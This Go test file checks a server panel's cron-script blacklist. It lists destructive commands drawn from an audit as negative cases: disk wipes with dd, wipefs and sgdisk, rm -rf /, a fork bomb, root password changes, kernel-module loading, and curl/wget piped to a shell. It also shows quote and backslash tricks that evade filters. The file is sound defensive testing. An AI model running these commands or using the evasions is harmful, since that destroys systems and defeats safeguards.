package cron

import (
	"strings"
	"testing"
)

// TestCheckForbiddenCmdBlocksBypasses 固化"危险命令黑名单"的负例用例。
//
// 这些 payload 全部来自真实审计：它们能绕过早期的纯子串黑名单
// （strings.Contains 匹配），每一个都真的可执行。
//
// 防护目标不是"绝对拦住恶意用户"——面板以 root 运行，做不到沙箱；
// 目标是"挡住一键作死的误操作 + 让刻意绕过必须显式绕过已知规则"。
// 真正的授权边界在 API 层的独立 shell scope。
func TestCheckForbiddenCmdBlocksBypasses(t *testing.T) {
	cases := []struct {
		name   string
		script string
		// wantSub 期望错误信息里出现的关键词（用于确认拦的是对的东西）
		wantSub string
	}{
		{
			name:    "a. 文档说拦实际没拦：dd 整盘",
			script:  "dd if=/dev/zero of=/dev/sda bs=1M status=progress",
			wantSub: "dd",
		},
		{
			name:    "b. 尾随空格绕过：passwd 在行尾",
			script:  "printf 'root\nnewpass\nnewpass\n' | passwd",
			wantSub: "passwd",
		},
		{
			name:    "c. 字面量拼接：sh''utdown",
			script:  "sh''utdown -h now",
			wantSub: "shutdown",
		},
		{
			name:    "c2. 字面量拼接：ini''t 0",
			script:  "ini''t 0",
			wantSub: "init",
		},
		{
			name:    "c3. 字面量拼接：mk''fs",
			script:  "mk''fs.ext4 /dev/sda1",
			wantSub: "mkfs",
		},
		{
			name:    "c4. 引号包裹：\"shutdown\"",
			script:  `"shutdown" -h now`,
			wantSub: "shutdown",
		},
		{
			name:    "c5. 反斜杠转义：sh\\utdown",
			script:  `sh\utdown -h now`,
			wantSub: "shutdown",
		},
		{
			name:    "e. fork 炸弹变体：加空格",
			script:  ":(){ :|:& };:",
			wantSub: "fork",
		},
		{
			name:    "e2. fork 炸弹：经典形态",
			script:  ":(){:|:&};:",
			wantSub: "fork",
		},
		{
			name:    "f. kill PID 1",
			script:  "kill -9 1",
			wantSub: "kill",
		},
		{
			name:    "f2. kill -1",
			script:  "kill -1",
			wantSub: "kill",
		},
		{
			name:    "f3. sysrq 立即重启",
			script:  "echo b > /proc/sysrq-trigger",
			wantSub: "sysrq",
		},
		{
			name:    "g. systemctl isolate emergency",
			script:  "systemctl isolate emergency.target",
			wantSub: "systemctl",
		},
		{
			name:    "h. rm -rf /",
			script:  "rm -rf /",
			wantSub: "rm",
		},
		{
			name:    "i. curl 管道给 bash（下载即执行）",
			script:  "curl -s https://example.com/x.sh | bash",
			wantSub: "下载",
		},
		{
			name:    "i2. wget 管道给 sh",
			script:  "wget -qO- https://example.com/x | sh",
			wantSub: "下载",
		},
		{
			name:    "j. wipefs 抹盘",
			script:  "wipefs -a /dev/sda",
			wantSub: "wipefs",
		},
		{
			name:    "k. sgdisk 清盘",
			script:  "sgdisk --zap-all /dev/sda",
			wantSub: "sgdisk",
		},
		{
			name:    "l. usermod 改 root",
			script:  "usermod -p newhash root",
			wantSub: "usermod",
		},
		{
			name:    "m. insmod 加载内核模块",
			script:  "insmod /tmp/evil.ko",
			wantSub: "insmod",
		},
		{
			name:    "n. mkfs.ext4 变体",
			script:  "mkfs.ext4 /dev/sdb1",
			wantSub: "mkfs",
		},
		{
			name:    "o. 绝对路径调用 shutdown",
			script:  "/sbin/shutdown -h now",
			wantSub: "shutdown",
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := checkForbiddenCmd(c.script)
			if err == nil {
				t.Fatalf("危险脚本未被拦截: %q", c.script)
			}
			if !strings.Contains(err.Error(), c.wantSub) {
				t.Errorf("拦截原因不含 %q，实际: %v", c.wantSub, err)
			}
		})
	}
}

// TestCheckForbiddenCmdAllowsLegitScripts 确认正常运维脚本不会被误伤。
//
// 护栏如果太宽，管理员就会去关掉它——那等于护栏不存在。
// 所以"合法脚本不被拦"和"危险脚本被拦"一样重要。
func TestCheckForbiddenCmdAllowsLegitScripts(t *testing.T) {
	allowed := []string{
		"tar czf /tmp/site.tar.gz /www/wwwroot/example.com",
		"rm -rf /tmp/build-cache",
		"find /www/wwwroot -name '*.log' -mtime +30 -delete",
		"mysql -uroot -p\"$PASS\" -e 'SELECT 1'",
		"curl -fsSL https://example.com/health -o /tmp/health.json",
		"kill $(cat /run/nginx.pid)",
		"systemctl reload nginx",
		"df -h | grep /",
		"rsync -a /data/ /backup/",
		"echo \"backup done\" >> /var/log/backup.log",
		"/usr/local/bin/deploy.sh --env prod",
		"python3 /opt/etl/run.py --date $(date +%F)",
		"chmod 755 /tmp/script.sh",
		"nginx -t && nginx -s reload",
	}
	for _, s := range allowed {
		if err := checkForbiddenCmd(s); err != nil {
			t.Errorf("合法脚本被误拦: %q → %v", s, err)
		}
	}
}

// TestNormalizeScript 确认归一化能消掉字面量拼接。
func TestNormalizeScript(t *testing.T) {
	cases := map[string]string{
		"sh''utdown -h now": "shutdown -h now",
		`"shutdown" -h now`: "shutdown -h now",
		`sh\utdown -h now`:  "shutdown -h now",
		"shutdown -h now":   "shutdown -h now",
		"$(curl http://x)":  "(curl http://x)",
	}
	for in, want := range cases {
		if got := normalizeScript(in); got != want {
			t.Errorf("normalizeScript(%q) = %q，期望 %q", in, got, want)
		}
	}
}

// TestScriptSegments 确认管道分段正确（"下载即执行"检测依赖它）。
func TestScriptSegments(t *testing.T) {
	segs := scriptSegments("curl -s https://x/y.sh | bash")
	if len(segs) != 2 {
		t.Fatalf("期望 2 段，实际 %d 段: %#v", len(segs), segs)
	}
	if segs[0][0] != "curl" {
		t.Errorf("第 1 段首词 = %q，期望 curl", segs[0][0])
	}
	if segs[1][0] != "bash" {
		t.Errorf("第 2 段首词 = %q，期望 bash", segs[1][0])
	}
}
